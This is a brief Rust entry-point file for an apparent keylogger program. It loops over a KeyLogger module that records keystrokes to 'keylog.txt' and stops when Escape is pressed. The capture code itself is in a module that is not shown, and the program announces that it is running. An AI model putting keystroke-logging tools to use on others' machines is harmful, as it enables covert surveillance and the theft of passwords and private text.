mod keylogger;

use keylogger::KeyLogger;
use std::time::Duration;

fn main() {
    let mut key_logger = KeyLogger::new("keylog.txt").expect("Failed to initialize KeyLogger");
    println!("The program is running. Press Escape to exit.");

    loop {
        key_logger.process_keys();
        if key_logger.should_exit() {
            println!("Escape pressed, exiting the program.");
            break;
        }
        std::thread::sleep(Duration::from_millis(10));
    }
}